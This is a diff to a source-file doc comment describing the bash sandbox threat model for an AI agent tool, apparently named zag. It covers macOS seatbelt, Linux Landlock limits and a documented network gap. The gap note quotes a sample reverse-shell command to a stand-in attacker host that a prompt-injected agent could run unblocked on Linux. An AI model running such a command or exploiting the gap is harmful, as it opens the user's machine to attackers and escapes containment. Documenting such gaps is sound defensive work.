@@ -10,13 +10,22 @@
 //!   write-allowed as literals so normal shell scripts function.
 //! * Lateral movement: ~/.ssh/authorized_keys, ~/.bashrc etc. denied by
 //!   the write scope.
-//! * Network tunneling: outbound network denied except loopback.
+//! * Network tunneling: outbound network denied except loopback on macOS.
+//!   Not enforced on Linux until landlock >= 6.7 or a seccomp companion
+//!   lands; see "Network gap" below.
 //!
 //! Platform support:
 //! * macOS: sandbox-exec with a generated seatbelt profile (see
 //!   buildSeatbeltProfile).
-//! * Linux: not yet sandboxed (see Phase B bubblewrap plan). Bash runs
-//!   unconfined; users on Linux must trust their agent prompts.
+//! * Linux: kernel Landlock LSM, filesystem-only. Installed by a
+//!   self-re-exec helper (see sandbox/helper_linux.zig). Kernels < 5.13
+//!   or with Landlock disabled at boot fall back to unsandboxed with
+//!   a logged warning. Network coverage is the documented gap.
+//! * Other platforms: unsandboxed with a logged warning.
+//!
+//! Network gap (Linux): a prompt-injected `nc -e /bin/sh attacker:4444`
+//! is not blocked by Landlock 5.13. Future Phase C will close this via
+//! either seccomp-bpf connect() filtering or Landlock 6.7 net rules.
 //!
 //! Opt-out:
 //! * zag.set_bash_sandbox_level("permissive") in config.lua disables the
